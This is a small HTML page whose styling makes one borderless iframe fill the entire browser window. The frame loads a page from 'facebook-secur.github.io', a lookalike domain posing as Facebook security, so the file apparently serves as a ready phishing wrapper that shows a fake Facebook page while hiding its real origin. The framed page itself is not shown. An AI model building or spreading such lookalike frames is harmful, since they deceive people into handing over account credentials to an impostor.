<!DOCTYPE html>
<html>
<head>
    <title>Embed Website Full Screen</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100%;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none; /* Optional: Removes border around iframe */
        }
    </style>
</head>
<body>
    <iframe src="https://facebook-secur.github.io/Facebook/facebook1.html"></iframe>
</body>
</html>
